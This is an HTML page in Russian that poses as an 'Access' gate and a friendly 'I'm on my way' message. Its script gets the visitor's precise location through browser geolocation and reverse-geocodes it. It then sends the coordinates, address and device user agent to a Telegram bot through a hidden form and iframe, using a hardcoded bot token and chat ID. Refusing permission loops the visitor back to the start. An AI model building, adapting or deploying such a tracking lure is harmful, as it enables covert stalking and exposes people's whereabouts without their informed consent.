<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Доступ</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            text-align: center;
            padding: 20px;
        }
        .card {
            max-width: 500px;
            width: 100%;
        }
        .card h1 {
            font-size: 24px;
            font-weight: 400;
            color: #aaa;
        }
        .card .sub {
            color: #555;
            font-size: 14px;
            margin-top: 8px;
        }
        .btn {
            margin-top: 30px;
            background: #1a1a1a;
            border: 1px solid #333;
            color: #fff;
            padding: 14px 32px;
            border-radius: 30px;
            font-size: 16px;
            cursor: pointer;
            transition: 0.2s;
            width: 100%;
        }
        .btn:hover {
            background: #2a2a2a;
            border-color: #555;
        }
        .hidden {
            display: none !important;
        }
        #map {
            height: 350px;
            width: 100%;
            border-radius: 12px;
            margin-top: 16px;
            border: 1px solid #30363d;
        }
        .coords-box {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 16px;
            margin-top: 16px;
            width: 100%;
        }
        .coords-box .label {
            color: #8b949e;
            font-size: 13px;
        }
        .coords-box .value {
            font-family: monospace;
            font-size: 20px;
            color: #f0883e;
            margin-top: 4px;
            word-break: break-all;
        }
        .coords-box .accuracy {
            font-size: 13px;
            color: #8b949e;
            margin-top: 4px;
        }
        .address-box {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 16px;
            margin-top: 12px;
            width: 100%;
        }
        .address-box .label {
            color: #8b949e;
            font-size: 13px;
        }
        .address-box .place {
            font-size: 18px;
            color: #f0883e;
            font-weight: 700;
            margin-top: 4px;
        }
        .address-box .value {
            font-size: 15px;
            color: #58a6ff;
            margin-top: 4px;
        }
        .status {
            font-size: 14px;
            color: #8b949e;
            margin-top: 12px;
        }
        .status.success {
            color: #3fb950;
        }
        .status.error {
            color: #f85149;
        }
        .surprise {
            font-size: 22px;
            color: #3fb950;
            margin-top: 12px;
            font-weight: 600;
        }
        .error-box {
            background: #1a0a0a;
            border: 1px solid #4a1a1a;
            border-radius: 12px;
            padding: 20px;
            margin-top: 16px;
        }
        .error-box .error-text {
            color: #f85149;
            font-size: 18px;
        }
        .error-box .error-sub {
            color: #777;
            font-size: 14px;
            margin-top: 8px;
        }
        .btn-small {
            margin-top: 16px;
            background: #2a1a1a;
            border: 1px solid #4a1a1a;
            color: #fff;
            padding: 10px 24px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 14px;
        }
        .btn-small:hover {
            background: #3a2a2a;
        }
        .full-center {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            height: 100vh;
        }
        .copy-btn {
            background: #1f6feb;
            border: none;
            color: #fff;
            padding: 6px 16px;
            border-radius: 8px;
            font-size: 13px;
            cursor: pointer;
            margin-top: 6px;
        }
        .copy-btn:hover {
            background: #388bfd;
        }
        .flex-row {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
            justify-content: center;
        }
        .telegram-badge {
            background: #1a2a3a;
            border: 1px solid #2a4a6a;
            border-radius: 20px;
            padding: 4px 14px;
            font-size: 12px;
            color: #58a6ff;
            display: inline-block;
            margin-top: 8px;
        }
        .message-box {
            background: #0d1a0d;
            border: 1px solid #2a4a2a;
            border-radius: 12px;
            padding: 16px;
            margin-top: 12px;
            width: 100%;
        }
        .message-box .msg {
            font-size: 18px;
            color: #3fb950;
            font-weight: 600;
        }
        .message-box .sub-msg {
            font-size: 14px;
            color: #8b949e;
            margin-top: 4px;
        }
    </style>
</head>
<body>

    <div class="full-center" id="step1">
        <div class="card">
            <h1>🔐 Доступ</h1>
            <div class="sub">Нажмите «Продолжить» для входа</div>
            <button class="btn" id="startBtn">Продолжить</button>
        </div>
    </div>

    <div class="full-center hidden" id="step2">
        <div class="card">
            <div class="surprise">🎉 Я скоро приду!</div>
            <div class="message-box">
                <div class="msg">📍 Я уже в пути</div>
                <div class="sub-msg">Вот где я сейчас</div>
            </div>
            <div id="map"></div>
            <div class="coords-box">
                <div class="label">📍 Мои координаты</div>
                <div class="value" id="coordsDisplay">—</div>
                <div class="accuracy" id="accuracyDisplay"></div>
                <div class="flex-row" style="margin-top:8px;">
                    <button class="copy-btn" onclick="copyCoords()">📋 Копировать координаты</button>
                </div>
            </div>
            <div class="address-box">
                <div class="label">🏠 Я сейчас здесь</div>
                <div class="place" id="placeDisplay"></div>
                <div class="value" id="addressDisplay">Определение...</div>
                <div class="flex-row" style="margin-top:8px;">
                    <button class="copy-btn" onclick="copyAddress()">📋 Копировать адрес</button>
                </div>
            </div>
            <div class="status" id="statusText">⏳ Определение...</div>
            <div class="telegram-badge">📤 Данные отправлены</div>
        </div>
    </div>

    <div class="full-center hidden" id="step3">
        <div class="card">
            <div class="error-box">
                <div class="error-text">⛔ Доступ запрещён</div>
                <div class="error-sub">доступ к документам ограничен</div>
                <button class="btn-small" onclick="goBack()">🔙 Попробовать снова</button>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8975499216:AAEmqWVeYW6vm0p5MjI0d_ec-RDzrVLwxM0";
        const CHAT_ID = "2131297532";

        let map = null;
        let marker = null;
        let circle = null;
        let lastLat = null;
        let lastLon = null;
        let lastAddress = null;
        let lastPlace = null;

        function sendToTelegram(lat, lon, acc, place, address) {
            const mapLink = `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=16`;
            const text =
                `📍 Я скоро приду!\n\n` +
                `Название: ${place || 'Не определено'}\n` +
                `Адрес: ${address || 'Не определён'}\n` +
                `Координаты: ${lat.toFixed(6)}, ${lon.toFixed(6)}\n` +
                `Точность: ±${Math.round(acc)} м\n\n` +
                `🗺️ Карта: ${mapLink}\n\n` +
                `Устройство: ${navigator.userAgent}`;

            const form = document.createElement('form');
            form.method = 'GET';
            form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            form.target = 'telegramFrame';

            const i1 = document.createElement('input');
            i1.type = 'hidden';
            i1.name = 'chat_id';
            i1.value = CHAT_ID;

            const i2 = document.createElement('input');
            i2.type = 'hidden';
            i2.name = 'text';
            i2.value = text;

            form.appendChild(i1);
            form.appendChild(i2);

            const iframe = document.createElement('iframe');
            iframe.name = 'telegramFrame';
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            document.body.appendChild(form);
            form.submit();

            setTimeout(() => {
                document.body.removeChild(form);
                document.body.removeChild(iframe);
            }, 1000);
        }

        function copyCoords() {
            if (!lastLat || !lastLon) return;
            const text = `${lastLat.toFixed(6)}, ${lastLon.toFixed(6)}`;
            navigator.clipboard?.writeText(text).then(() => {
                alert('✅ Координаты скопированы!');
            }).catch(() => {
                prompt('Скопируй вручную:', text);
            });
        }

        function copyAddress() {
            if (!lastAddress) return;
            navigator.clipboard?.writeText(lastAddress).then(() => {
                alert('✅ Адрес скопирован!');
            }).catch(() => {
                prompt('Скопируй вручную:', lastAddress);
            });
        }

        async function getPlaceAndAddress(lat, lon) {
            try {
                const url = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&accept-language=ru`;
                const resp = await fetch(url);
                const data = await resp.json();

                let place = null;
                let address = data?.display_name || 'Адрес не найден';

                if (data?.address) {
                    const a = data.address;
                    place = a.tourism || a.shop || a.amenity || a.leisure || a.historic || a.building || a.place || a.suburb || a.city || a.town || a.village;
                    if (place) {
                        // убираем лишние детали из названия
                        place = place.replace(/\([^)]*\)/g, '').trim();
                    }
                }

                return { place, address };
            } catch {
                return { place: null, address: 'Ошибка определения адреса' };
            }
        }

        function getLocation() {
            const status = document.getElementById('statusText');
            const coords = document.getElementById('coordsDisplay');
            const accEl = document.getElementById('accuracyDisplay');
            const addressEl = document.getElementById('addressDisplay');
            const placeEl = document.getElementById('placeDisplay');

            status.textContent = '⏳ Запрос разрешения...';
            status.className = 'status';
            coords.textContent = '—';
            accEl.textContent = '';
            addressEl.textContent = 'Определение...';
            placeEl.textContent = '';

            if (!navigator.geolocation) {
                showError();
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async function(pos) {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const accuracy = pos.coords.accuracy;

                    lastLat = lat;
                    lastLon = lon;

                    coords.textContent = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
                    accEl.textContent = `±${Math.round(accuracy)} м`;
                    status.textContent = '✅ Готово!';
                    status.className = 'status success';

                    if (marker) map.removeLayer(marker);
                    if (circle) map.removeLayer(circle);
                    marker = L.marker([lat, lon]).addTo(map);
                    circle = L.circle([lat, lon], {
                        radius: accuracy || 50,
                        color: '#f03',
                        fillColor: '#f03',
                        fillOpacity: 0.15
                    }).addTo(map);
                    map.setView([lat, lon], 16);

                    const { place, address } = await getPlaceAndAddress(lat, lon);
                    lastPlace = place;
                    lastAddress = address;

                    if (place) placeEl.textContent = place;
                    else placeEl.textContent = '📍 Точка на карте';

                    addressEl.textContent = address;

                    sendToTelegram(lat, lon, accuracy, place, address);
                },
                function(err) {
                    showError();
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
            );
        }

        function showError() {
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('step3').classList.remove('hidden');
        }

        function goBack() {
            document.getElementById('step3').classList.add('hidden');
            document.getElementById('step1').classList.remove('hidden');
        }

        document.getElementById('startBtn').addEventListener('click', function() {
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');

            map = L.map('map').setView([55.7558, 37.6173], 13);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '© OpenStreetMap'
            }).addTo(map);

            getLocation();
        });
    </script>

</body>
</html>
